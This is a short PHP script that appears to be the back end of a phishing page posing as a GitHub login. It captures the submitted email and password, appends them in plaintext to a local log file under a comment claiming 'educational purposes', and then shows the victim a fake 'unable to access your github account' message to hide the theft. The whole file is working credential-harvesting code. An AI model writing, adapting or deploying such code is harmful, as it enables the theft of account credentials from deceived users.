<?php
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Log the captured data (for educational purposes)
    $file = fopen("log.txt", "a");
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);
    
    // echo "Login failed. Please try again.";

?>

<h1>Unable to access your github account at the moment,please try after sometime.</h1>
<?php

